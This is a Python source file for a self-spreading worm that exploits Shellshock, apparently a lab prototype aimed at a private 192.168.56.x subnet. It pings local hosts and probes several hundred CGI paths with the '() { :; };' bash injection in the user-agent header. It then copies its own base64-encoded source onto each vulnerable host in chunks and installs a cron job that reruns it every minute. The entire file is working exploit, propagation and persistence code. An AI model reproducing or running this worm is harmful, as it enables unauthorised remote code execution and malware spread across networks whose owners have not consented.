#!/usr/bin/env python3

import os, sys, subprocess
import base64
from datetime import datetime

cgi_list = ['/bWAPP/cgi-bin/shellshock.sh', '/admin.cgi', '/administrator.cgi', '/agora.cgi', '/aktivate/cgi-bin/catgy.cgi', '/analyse.cgi', '/apps/web/vs_diag.cgi', '/axis-cgi/buffer/command.cgi', '/b2-include/b2edit.showposts.php', '/bandwidth/index.cgi', '/bigconf.cgi', '/cartcart.cgi', '/cart.cgi', '/ccbill/whereami.cgi', '/cgi-bin/14all-1.1.cgi', '/cgi-bin/14all.cgi', '/cgi-bin/a1disp3.cgi', '/cgi-bin/a1stats/a1disp3.cgi', '/cgi-bin/a1stats/a1disp4.cgi', '/cgi-bin/addbanner.cgi', '/cgi-bin/add_ftp.cgi', '/cgi-bin/adduser.cgi', '/cgi-bin/admin/admin.cgi', '/cgi-bin/admin.cgi', '/cgi-bin/admin/getparam.cgi', '/cgi-bin/adminhot.cgi', '/cgi-bin/admin.pl', '/cgi-bin/admin/setup.cgi', '/cgi-bin/adminwww.cgi', '/cgi-bin/af.cgi', '/cgi-bin/aglimpse.cgi', '/cgi-bin/alienform.cgi', '/cgi-bin/AnyBoard.cgi', '/cgi-bin/architext_query.cgi', '/cgi-bin/astrocam.cgi', '/cgi-bin/AT-admin.cgi', '/cgi-bin/AT-generate.cgi', '/cgi-bin/auction/auction.cgi', '/cgi-bin/auktion.cgi', '/cgi-bin/ax-admin.cgi', '/cgi-bin/ax.cgi', '/cgi-bin/axs.cgi', '/cgi-bin/badmin.cgi', '/cgi-bin/banner.cgi', '/cgi-bin/bannereditor.cgi', '/cgi-bin/bb-ack.sh', '/cgi-bin/bb-histlog.sh', '/cgi-bin/bb-hist.sh', '/cgi-bin/bb-hostsvc.sh', '/cgi-bin/bb-replog.sh', '/cgi-bin/bb-rep.sh', '/cgi-bin/bbs_forum.cgi', '/cgi-bin/bigconf.cgi', '/cgi-bin/bizdb1-search.cgi', '/cgi-bin/blog/mt-check.cgi', '/cgi-bin/blog/mt-load.cgi', '/cgi-bin/bnbform.cgi', '/cgi-bin/book.cgi', '/cgi-bin/boozt/admin/index.cgi', '/cgi-bin/bsguest.cgi', '/cgi-bin/bslist.cgi', '/cgi-bin/build.cgi', '/cgi-bin/bulk/bulk.cgi', '/cgi-bin/cached_feed.cgi', '/cgi-bin/cachemgr.cgi', '/cgi-bin/calendar/index.cgi', '/cgi-bin/cartmanager.cgi', '/cgi-bin/cbmc/forums.cgi', '/cgi-bin/ccvsblame.cgi', '/cgi-bin/c_download.cgi', '/cgi-bin/cgforum.cgi', '/cgi-bin/.cgi', '/cgi-bin/cgi_process', '/cgi-bin/classified.cgi', '/cgi-bin/classifieds.cgi', '/cgi-bin/classifieds/classifieds.cgi', '/cgi-bin/classifieds/index.cgi', '/cgi-bin/.cobalt/alert/service.cgi', '/cgi-bin/.cobalt/message/message.cgi', '/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi', '/cgi-bin/commandit.cgi', '/cgi-bin/commerce.cgi', '/cgi-bin/common/listrec.pl', '/cgi-bin/compatible.cgi', '/cgi-bin/Count.cgi', '/cgi-bin/csChatRBox.cgi', '/cgi-bin/csGuestBook.cgi', '/cgi-bin/csLiveSupport.cgi', '/cgi-bin/CSMailto.cgi', '/cgi-bin/CSMailto/CSMailto.cgi', '/cgi-bin/csNews.cgi', '/cgi-bin/csNewsPro.cgi', '/cgi-bin/csPassword.cgi', '/cgi-bin/csPassword/csPassword.cgi', '/cgi-bin/csSearch.cgi', '/cgi-bin/csv_db.cgi', '/cgi-bin/cvsblame.cgi', '/cgi-bin/cvslog.cgi', '/cgi-bin/cvsquery.cgi', '/cgi-bin/cvsqueryform.cgi', '/cgi-bin/day5datacopier.cgi', '/cgi-bin/day5datanotifier.cgi', '/cgi-bin/db_manager.cgi', '/cgi-bin/dbman/db.cgi', '/cgi-bin/dcforum.cgi', '/cgi-bin/dcshop.cgi', '/cgi-bin/dfire.cgi', '/cgi-bin/diagnose.cgi', '/cgi-bin/dig.cgi', '/cgi-bin/directorypro.cgi', '/cgi-bin/download.cgi', '/cgi-bin/e87_Ba79yo87.cgi', '/cgi-bin/emu/html/emumail.cgi', '/cgi-bin/emumail.cgi', '/cgi-bin/emumail/emumail.cgi', '/cgi-bin/enter.cgi', '/cgi-bin/environ.cgi', '/cgi-bin/ezadmin.cgi', '/cgi-bin/ezboard.cgi', '/cgi-bin/ezman.cgi', '/cgi-bin/ezshopper2/loadpage.cgi', '/cgi-bin/ezshopper3/loadpage.cgi', '/cgi-bin/ezshopper/loadpage.cgi', '/cgi-bin/ezshopper/search.cgi', '/cgi-bin/faqmanager.cgi', '/cgi-bin/FileSeek2.cgi', '/cgi-bin/FileSeek.cgi', '/cgi-bin/finger.cgi', '/cgi-bin/flexform.cgi', '/cgi-bin/fom.cgi', '/cgi-bin/fom/fom.cgi', '/cgi-bin/FormHandler.cgi', '/cgi-bin/FormMail.cgi', '/cgi-bin/gbadmin.cgi', '/cgi-bin/gbook/gbook.cgi', '/cgi-bin/generate.cgi', '/cgi-bin/getdoc.cgi', '/cgi-bin/gH.cgi', '/cgi-bin/gm-authors.cgi', '/cgi-bin/gm.cgi', '/cgi-bin/gm-cplog.cgi', '/cgi-bin/guestbook.cgi', '/cgi-bin/handler', '/cgi-bin/handler.cgi', '/cgi-bin/handler/netsonar', '/cgi-bin/hitview.cgi', '/cgi-bin/hsx.cgi', '/cgi-bin/html2chtml.cgi', '/cgi-bin/html2wml.cgi', '/cgi-bin/htsearch.cgi', '/cgi-bin/icat', '/cgi-bin/if/admin/nph-build.cgi', '/cgi-bin/ikonboard/help.cgi', '/cgi-bin/ImageFolio/admin/admin.cgi', '/cgi-bin/imageFolio.cgi', '/cgi-bin/index.cgi', '/cgi-bin/infosrch.cgi', '/cgi-bin/jammail.pl', '/cgi-bin/journal.cgi', '/cgi-bin/lastlines.cgi', '/cgi-bin/loadpage.cgi', '/cgi-bin/login.cgi', '/cgi-bin/logit.cgi', '/cgi-bin/log-reader.cgi', '/cgi-bin/lookwho.cgi', '/cgi-bin/lwgate.cgi', '/cgi-bin/MachineInfo', '/cgi-bin/MachineInfo', '/cgi-bin/magiccard.cgi', '/cgi-bin/mail/emumail.cgi', '/cgi-bin/maillist.cgi', '/cgi-bin/mailnews.cgi', '/cgi-bin/mail/nph-mr.cgi', '/cgi-bin/main.cgi', '/cgi-bin/main_menu.pl', '/cgi-bin/man.sh', '/cgi-bin/mini_logger.cgi', '/cgi-bin/mmstdod.cgi', '/cgi-bin/moin.cgi', '/cgi-bin/mojo/mojo.cgi', '/cgi-bin/mrtg.cgi', '/cgi-bin/mt.cgi', '/cgi-bin/mt/mt.cgi', '/cgi-bin/mt/mt-check.cgi', '/cgi-bin/mt/mt-load.cgi', '/cgi-bin/mt-static/mt-check.cgi', '/cgi-bin/mt-static/mt-load.cgi', '/cgi-bin/musicqueue.cgi', '/cgi-bin/myguestbook.cgi', '/cgi-bin/.namazu.cgi', '/cgi-bin/nbmember.cgi', '/cgi-bin/netauth.cgi', '/cgi-bin/netpad.cgi', '/cgi-bin/newsdesk.cgi', '/cgi-bin/nlog-smb.cgi', '/cgi-bin/nph-emumail.cgi', '/cgi-bin/nph-exploitscanget.cgi', '/cgi-bin/nph-publish.cgi', '/cgi-bin/nph-test.cgi', '/cgi-bin/pagelog.cgi', '/cgi-bin/pbcgi.cgi', '/cgi-bin/perlshop.cgi', '/cgi-bin/pfdispaly.cgi', '/cgi-bin/pfdisplay.cgi', '/cgi-bin/phf.cgi', '/cgi-bin/photo/manage.cgi', '/cgi-bin/photo/protected/manage.cgi', '/cgi-bin/php-cgi', '/cgi-bin/php.cgi', '/cgi-bin/php.fcgi', '/cgi-bin/ping.sh', '/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi', '/cgi-bin/pollssi.cgi', '/cgi-bin/postcards.cgi', '/cgi-bin/powerup/r.cgi', '/cgi-bin/printenv', '/cgi-bin/probecontrol.cgi', '/cgi-bin/profile.cgi', '/cgi-bin/publisher/search.cgi', '/cgi-bin/quickstore.cgi', '/cgi-bin/quizme.cgi', '/cgi-bin/ratlog.cgi', '/cgi-bin/r.cgi', '/cgi-bin/register.cgi', '/cgi-bin/replicator/webpage.cgi/', '/cgi-bin/responder.cgi', '/cgi-bin/robadmin.cgi', '/cgi-bin/robpoll.cgi', '/cgi-bin/rtpd.cgi', '/cgi-bin/sbcgi/sitebuilder.cgi', '/cgi-bin/scoadminreg.cgi', '/cgi-bin-sdb/printenv', '/cgi-bin/sdbsearch.cgi', '/cgi-bin/search', '/cgi-bin/search.cgi', '/cgi-bin/search/search.cgi', '/cgi-bin/sendform.cgi', '/cgi-bin/shop.cgi', '/cgi-bin/shopper.cgi', '/cgi-bin/shopplus.cgi', '/cgi-bin/showcheckins.cgi', '/cgi-bin/simplestguest.cgi', '/cgi-bin/simplestmail.cgi', '/cgi-bin/smartsearch.cgi', '/cgi-bin/smartsearch/smartsearch.cgi', '/cgi-bin/snorkerz.bat', '/cgi-bin/snorkerz.bat', '/cgi-bin/snorkerz.cmd', '/cgi-bin/snorkerz.cmd', '/cgi-bin/sojourn.cgi', '/cgi-bin/spin_client.cgi', '/cgi-bin/start.cgi', '/cgi-bin/status', '/cgi-bin/status_cgi', '/cgi-bin/store/agora.cgi', '/cgi-bin/store.cgi', '/cgi-bin/store/index.cgi', '/cgi-bin/survey.cgi', '/cgi-bin/sync.cgi', '/cgi-bin/talkback.cgi', '/cgi-bin/technote/main.cgi', '/cgi-bin/test2.pl', '/cgi-bin/test-cgi', '/cgi-bin/test.cgi', '/cgi-bin/testing_whatever', '/cgi-bin/test/test.cgi', '/cgi-bin/tidfinder.cgi', '/cgi-bin/tigvote.cgi', '/cgi-bin/title.cgi', '/cgi-bin/top.cgi', '/cgi-bin/traffic.cgi', '/cgi-bin/troops.cgi', '/cgi-bin/ttawebtop.cgi/', '/cgi-bin/ultraboard.cgi', '/cgi-bin/upload.cgi', '/cgi-bin/urlcount.cgi', '/cgi-bin/viewcvs.cgi', '/cgi-bin/view_help.cgi', '/cgi-bin/viralator.cgi', '/cgi-bin/virgil.cgi', '/cgi-bin/vote.cgi', '/cgi-bin/vpasswd.cgi', '/cgi-bin/way-board.cgi', '/cgi-bin/way-board/way-board.cgi', '/cgi-bin/webbbs.cgi', '/cgi-bin/webcart/webcart.cgi', '/cgi-bin/webdist.cgi', '/cgi-bin/webif.cgi', '/cgi-bin/webmail/html/emumail.cgi', '/cgi-bin/webmap.cgi', '/cgi-bin/webspirs.cgi', '/cgi-bin/Web_Store/web_store.cgi', '/cgi-bin/whois.cgi', '/cgi-bin/whois_raw.cgi', '/cgi-bin/whois/whois.cgi', '/cgi-bin/wrap', '/cgi-bin/wrap.cgi', '/cgi-bin/wwwboard.cgi.cgi', '/cgi-bin/YaBB/YaBB.cgi', '/cgi-bin/zml.cgi', '/cgi-mod/index.cgi', '/cgis/wwwboard/wwwboard.cgi', '/cgi-sys/addalink.cgi', '/cgi-sys/defaultwebpage.cgi', '/cgi-sys/domainredirect.cgi', '/cgi-sys/entropybanner.cgi', '/cgi-sys/entropysearch.cgi', '/cgi-sys/FormMail-clone.cgi', '/cgi-sys/helpdesk.cgi', '/cgi-sys/mchat.cgi', '/cgi-sys/randhtml.cgi', '/cgi-sys/realhelpdesk.cgi', '/cgi-sys/realsignup.cgi', '/cgi-sys/signup.cgi', '/connector.cgi', '/cp/rac/nsManager.cgi', '/create_release.sh', '/CSNews.cgi', '/csPassword.cgi', '/dcadmin.cgi', '/dcboard.cgi', '/dcforum.cgi', '/dcforum/dcforum.cgi', '/debuff.cgi', '/debug.cgi', '/details.cgi', '/edittag/edittag.cgi', '/emumail.cgi', '/enter_buff.cgi', '/enter_bug.cgi', '/ez2000/ezadmin.cgi', '/ez2000/ezboard.cgi', '/ez2000/ezman.cgi', '/fcgi-bin/echo', '/fcgi-bin/echo', '/fcgi-bin/echo2', '/fcgi-bin/echo2', '/Gozila.cgi', '/hitmatic/analyse.cgi', '/hp_docs/cgi-bin/index.cgi', '/html/cgi-bin/cgicso', '/html/cgi-bin/cgicso', '/index.cgi', '/info.cgi', '/infosrch.cgi', '/login.cgi', '/mailview.cgi', '/main.cgi', '/megabook/admin.cgi', '/ministats/admin.cgi', '/mods/apage/apage.cgi', '/_mt/mt.cgi', '/musicqueue.cgi', '/ncbook.cgi', '/newpro.cgi', '/newsletter.sh', '/oem_webstage/cgi-bin/oemapp_cgi', '/page.cgi', '/parse_xml.cgi', '/photodata/manage.cgi', '/photo/manage.cgi', '/print.cgi', '/process_buff.cgi', '/process_bug.cgi', '/pub/english.cgi', '/quikmail/nph-emumail.cgi', '/quikstore.cgi', '/reviews/newpro.cgi', '/ROADS/cgi-bin/search.pl', '/sample01.cgi', '/sample02.cgi', '/sample03.cgi', '/sample04.cgi', '/sampleposteddata.cgi', '/scancfg.cgi', '/scancfg.cgi', '/servers/link.cgi', '/setpasswd.cgi', '/SetSecurity.shm', '/shop/member_html.cgi', '/shop/normal_html.cgi', '/site_searcher.cgi', '/siteUserMod.cgi', '/submit.cgi', '/technote/print.cgi', '/template.cgi', '/test.cgi', '/ucsm/isSamInstalled.cgi', '/upload.cgi', '/userreg.cgi', '/users/scripts/submit.cgi', '/vood/cgi-bin/vood_view.cgi', '/Web_Store/web_store.cgi', '/webtools/bonsai/ccvsblame.cgi', '/webtools/bonsai/cvsblame.cgi', '/webtools/bonsai/cvslog.cgi', '/webtools/bonsai/cvsquery.cgi', '/webtools/bonsai/cvsqueryform.cgi', '/webtools/bonsai/showcheckins.cgi', '/wwwadmin.cgi', '/wwwboard.cgi', '/wwwboard/wwwboard.cgi']

folder = '/tmp/.dirt'
worm_source = sys.argv[0]

# Payload
payload_location = f'{folder}/test_payload'
payload_content = f"f = open('{folder}/test_payload_exec','w')"

# Encode worm source code and break into chunks for injection
n = 5000
data = open(worm_source, 'rb').read()
encoded = base64.b64encode(data).decode()
worm64 = [encoded[i:i+n] for i in range(0, len(encoded), n)]

# Worm tracking
def log():
	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
	hostinfo = os.uname()

	f = open(f'{folder}/log','x')
	f.write(f'{timestamp}\n{hostinfo}\n')
	f.close()

# Creates a copy of the payload on host
def copy_payload():
	if not os.path.exists(folder):
		os.mkdir(folder)

	# If payload is already on host, then exit program
	try:
		f = open(payload_location,'x')
		f.write(payload_content)
		f.close()
	except:
		sys.exit(0)

# Executes payload on host
def execute_payload():
	exec(open(payload_location).read())
	log()

# Has the target been wormed?
def already_wormed(target): # Pass in target as argument
	# url = 'http://192.168.56.111/cgi-bin/shock.sh' # Test
	cmd = 'ls -la /tmp'

	check = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
	check += '\'' + cmd + '\'"'
	check += ' ' + target

	# Gets output of curl request
	a = subprocess.run(check, shell=True, stdout=subprocess.PIPE).stdout.decode()

	if '.dirt' in a:
		return True
	return False

# Inject worm to target and executes worm on target
def inject(target, cmd_list): # Pass in target as argument
	# url = 'http://192.168.56.111/cgi-bin/shock.sh' # Test

	for cmd in cmd_list:
	# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '{cmd}'" {target}
		exploit = 'curl -s -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
		exploit += '\'' + cmd + '\'"'
		exploit += ' ' + target + ' > /dev/null'
		subprocess.run(exploit, shell=True)

# Prototype for shellshock exploit
def spread(targets):
	# targets = ['http://192.168.56.111/cgi-bin/shock.sh'] # Hardcoding this for now

	# List of commands for RCE
	cmd_list = []

	# Worm copying itself on vulnerable host
	cmd_list.append(f'mkdir {folder}')
	for chunk in worm64:
		cmd_list.append(f'echo {chunk} >> {folder}/.worm64')
	cmd_list.append(f'/usr/bin/base64 -d {folder}/.worm64 > {folder}/worm.py')
	cmd_list.append(f'/bin/chmod 777 {folder}/worm.py')

	# Create bash script that adds cron job to execute worm every minute
	cmd_list.append(f'echo IyEvYmluL2Jhc2gKY3Jvbj0iKi8xICogKiAqICogL3Vzci9sb2NhbC9iaW4vcHl0aG9uMyAvdG1wLy5kaXJ0L3dvcm0ucHkiCmVjaG8gIiRjcm9uIiB8IGNyb250YWIgLQ== > {folder}/.cron')
	cmd_list.append(f'/usr/bin/base64 -d {folder}/.cron > {folder}/cron.sh')
	cmd_list.append(f'/bin/chmod 777 {folder}/cron.sh')
	cmd_list.append(f'{folder}/cron.sh')

	for target in targets:
		if not already_wormed(target):
			inject(target, cmd_list)

# Host discovery on local network
# TODO: Identify subnet and adjust scan for different subnets
def local_ip_finder():
	local_ips = []
	#subprocess.run(f"ifconfig | grep inet | head -n 1 | cut -d \" \" -f10 | cut -d \".\" -f1-3 > {folder}/ip.txt", shell=True)
	subprocess.run(f"echo 192.168.56 > {folder}/ip.txt", shell=True)
	part_local_ip = open(f"{folder}/ip.txt", "r").read().strip() # This will output an IP format of XXX.XXX.XXX

	FNULL = open(os.devnull, 'w') # Hide output of ping

	for x in range(109,115): # CHANGE THIS to 1,255 for final
		full_local_ip = part_local_ip + "." + str(x)
		#for y in range(1,255): # If I want to search ip XXX.XXX.yyy.yyy
		#	full_local_ip = subnet_local_ip + "." + str(y)
		ping_ip = subprocess.call(['ping', '-q', '-c', '1', "-W", "1", full_local_ip], stdout=FNULL)
		if ping_ip == 0:
			local_ips.append(full_local_ip)
		else:
			pass

	FNULL.close()

	f = open(f'{folder}/log','a')
	f.write(f'Hosts Discovered: {local_ips}\n')
	f.close()

	return local_ips

# Search for vulnerable hosts
def vuln_check(local_ips):
	vuln_url_path = []
	cmd = "echo 123foo123"
	# url = "http://192.168.220.128/cgi-bin/hello.sh"
	# print(list_of_ip)
	for ip in local_ips:
		for uri in cgi_list:
			url = f'http://{ip}{uri}'
			exploit = 'curl -f -s --max-time 3 -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
			exploit += '\'' + cmd + '\'"'
			exploit += ' ' + url
			#print(exploit)
			output = subprocess.getoutput(exploit)
			if "123foo123" in str(output):
				vuln_url_path.append(url)

	f = open(f'{folder}/log','a')
	f.write(f'Vulnerable URLs: {vuln_url_path}\n')
	f.close()

	return vuln_url_path #Final list of vuln urls

def main():
	copy_payload() # Success if test_payload is created
	execute_payload() # Success if test_payload_exec is created. Also creates log.txt

	# Scan local network for IPs and finds shellshock-vulnerable URLs
	local_ips = local_ip_finder()
	targets = vuln_check(local_ips)

	# Try to spread to vulnerable hosts
	spread(targets)

main()
